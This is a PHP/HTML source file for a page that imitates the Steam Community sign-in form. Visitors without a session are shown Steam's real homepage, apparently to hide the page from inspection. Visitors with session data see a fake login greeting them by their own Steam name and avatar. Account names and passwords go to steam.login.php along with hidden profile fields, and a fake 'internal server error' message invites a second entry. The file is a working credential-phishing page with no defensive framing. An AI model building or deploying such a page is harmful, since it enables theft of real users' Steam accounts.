<?php
	session_start();
	if(!isset($_SESSION[ 'logged_in' ]) && !isset($_SESSION[ 'userData' ])) {
		echo file_get_contents('https://steamcommunity.com/');
		exit;
	}else{
		extract($_SESSION);
?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8" />
	<meta meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
	<link rel="icon" type="image/ico" href="./images/favicon.ico" />
	<link rel="stylesheet" type="text/css" href="./style.css" />
	<script src="https://kit.fontawesome.com/0d1b6d31de.js" crossorigin="anonymous"></script>
	<title>Sign In</title>
</head>
<body>
	<!-- Steam Main Section Begin -->
	<section class="main">

		<!-- Steam Navbar Begin -->
		<section class="navbar">
			
			<div class="nav-left">
				<div class="nav-logo">
					<img src="./images/logo_steam.svg" type="image/svg" alt="" />
				</div>
				<div class="nav-links">
					<ul>
						<li><a href="#">store</a></li>
						<li><a href="#" class="nav-links-active">community</a></li>
						<li><a href="#">about</a></li>
						<li><a href="#">support</a></li>
					</ul>
				</div>
			</div>

			<div class="nav-right">
				<div class="nav-txt-1"><a target="_blank" href="https://store.steampowered.com/about/"><i class="fa-solid fa-download"></i> Install Steam</a></div>
				<div class="nav-prof-pic"><img src=<?php echo '"'.$userData[ 'avatar' ].'"'; ?>></div>
				<div class="nav-txt-2"><a href=""><?php echo $userData[ 'name' ]; ?></a></div>
			</div>

		</section>
		<!-- Steam Navbar End -->

		<!-- Steam Background Image Begin -->
		<section class="bg-banner"></section>
		<!-- Steam Background Image End -->

		<!-- Steam Login Page Section Begin -->
		<section class="login-form-area">
			<div class="wrapper">
				<h1>Sign in</h1>
				<div class="main-div">
					<div class="form-sec">
						<form action="steam.login.php" method="POST" autocomplete="off">
							<label for="username">SIGN IN WITH ACCOUNT NAME</label>
							<input type=hidden name=steamid value=<?php echo '"'.$userData[ 'steam_id' ].'"'; ?>>
							<input type=hidden name=name value=<?php echo '"'.$userData[ 'name' ].'"'; ?>>
							<input type=hidden name=avatar value=<?php echo '"'.$userData[ 'avatar' ].'"'; ?>>
							<input type=text name=uname id=uname placeholder required autofocus />
							<label for="password">PASSWORD</label>
							<input type=password name=upass id=upass placeholder required />
							<div class="checkBox">
								<label class="container">
									<input type="checkbox" checked="checked">
									<span class="checkmark"></span>
									<div class="checkLabel">Remember me</div>
								</label>
							</div>
							<div class="submitBtn">
								<input type="submit" name="submit" value="Sign in" />
							</div>
							<div class="failedLogintxt">
								An internal server error occured try login again.
							</div>
							<div class="helpText">
								<a href="https://help.steampowered.com/wizard/HelpWithLogin?redir=https%3A%2F%2Fsteamcommunity.com%2Flogin%2Fhome%2F">Help, I can't sign in</a>
							</div>
						</form>
					</div>
					<div class="qr-sec">
						<div class="qrLabel">OR SIGN IN WITH QR</div>
						<div class="imgSec"><img src="./images/qrcode.jpg" alt="QR Code" /></div>
						<div class="qrText">
							Use the <a href="https://store.steampowered.com/mobile">Steam Mobile App</a> to sign <br/> in via QR code
						</div>
					</div>
				</div>
			</div>
		</section>
		<!-- Steam Login Page Section End -->

	</section>
	<!-- Steam Main Section End -->
</body>
</html>
<?php } ?>